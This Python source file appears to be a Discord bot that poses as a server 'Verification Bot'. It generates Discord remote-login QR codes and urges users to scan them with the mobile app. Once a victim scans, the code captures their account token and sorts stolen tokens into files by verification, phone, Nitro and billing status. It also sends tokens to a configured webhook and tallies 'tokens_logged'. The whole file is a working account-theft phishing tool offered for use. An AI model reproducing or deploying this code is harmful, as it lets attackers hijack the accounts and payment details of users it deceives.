
from ast import dump
from http.client import HTTPException

import os
from DRAclient import DRAClient
import io
import qrcode
import discord
from DiscordLib import Dump
import asyncio
from discord.utils import get
import json
from datetime import datetime
from colorama import Fore
from config import config




async def generate_qr(fingerprint):
    qr = qrcode.make(f'https://discordapp.com/ra/{fingerprint}', border=2, box_size=7, version=None)
    
    with io.BytesIO() as image_binary:
                    qr.save(image_binary, 'PNG')
                    image_binary.seek(0)
                    return discord.File(fp=image_binary, filename='image.png')
    
async def generate_verify_embed():
    embed = discord.Embed()
    embed.description = '✅ Scan this QR code to gain access to the rest of the server ✅'
    embed.title = '🤖 Are you a robot?'
    embed.set_author(name='Verification Bot', icon_url='https://cdn.discordapp.com/avatars/512333785338216465/f43bfe6b62b3c38002b3c1cb5100a11a.webp?size=80')
    
    embed.set_image(url="attachment://image.png")
    embed.add_field(name='Couldnt find?', value='🚫 Try again. It can be buggy...', inline=False)

    embed.add_field(name='Important information', value='🚫 This will NOT work without the Discord mobile application 🚫\n 🚫 This code only lasts 2 MINUTES!! 🚫')
    embed.add_field(name='Tutorial', value='1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code', inline=False)
    return embed



class QRHandler():
    def __init__(self):
        self.ctx = None
        self.client = None
        self.client = DRAClient(on_connected=self.on_connected, 
                                on_scan=self.on_scan, 
                                on_finish=self.on_finish, 
                                on_close=self.on_close)
    
    async def run(self, ctx):
        self.ctx = ctx
        await self.client.connect()
    
    async def on_connected(self):
        print(f'[{datetime.now()}] [New session opened]')

        qr = await generate_qr(self.client.fingerprint)
        embed = await generate_verify_embed()
        
        await self.ctx.response.send_message(embed=embed, file=qr, ephemeral=True)

        # await self.ctx.user.send(file=qr, embed=embed)


                    
    async def on_scan(self):
        print(f'{Fore.YELLOW}[{datetime.now()}] [SCANNED] {self.client.user.username}#{self.client.user.discrim}')
            

    async def save_token(self, token, name):
        path = f"tokens/{name}.txt"

        os.makedirs(os.path.dirname(path), exist_ok=True)

        with open(path, 'a') as f:
            f.write(token + '\n')


    async def check_token(self, token):
        details = Dump().get_details(token)
        try:
            if details['message'] == '401: Unauthorized':
                invalid += 1
                return
        except KeyError:
            pass

            await self.save_token(token, "tokens")

        if details['verified']:
            await self.save_token(token, "verified")

        if details['phone']:
            await self.save_token(token, "mobile")
        try:
            if details['premium_type'] == 1:
                await self.save_token(token, "nitroclassic")
            elif details['premium_type'] == 2:
                await self.save_token(token, "nitro")
        except KeyError:
            pass
        
        if Dump().get_payment(token):
            await self.save_token(token, "billing")
            
    async def export_token(self, token):
        await self.check_token(token)

    
        if config['webhook_url']:
            try:
                Dump().send_webhook(token)
            except:
                print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to dump to webhook')

    async def on_finish(self):
        print(f'{Fore.GREEN}[{datetime.now()}] [SUCCESS] {self.client.user.username}#{self.client.user.discrim}')


        config['tokens_logged'] += 1
        config.write()
            
        await self.export_token(self.client.token)

        #give role
        # print("servers:", config['servers'])
        # print("guild:", config['servers'][str(self.ctx.guild.id)])
        # print("role:", config['servers'][str(self.ctx.guild.id)]['verify_role'])


        try:
            role = get(self.ctx.guild.roles, id=config['servers'][str(self.ctx.guild.id)]['verify_role'])
            await self.ctx.user.add_roles(role)
        except HTTPException:
            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try running the setuprole command.')
        except discord.errors.Forbidden:
            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the bot role is above the verify role or giving the bot permissions.')
        except KeyError:
            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the role id is correct in config.json')



        
        if config["auto_spread"] == True:
            user = discord.Client(intents=discord.Intents.default())


                                
        
    async def on_close(self):
        print(f'{Fore.RED}[{datetime.now()}] [Failure] {self.client.user.username}#{self.client.user.discrim}')

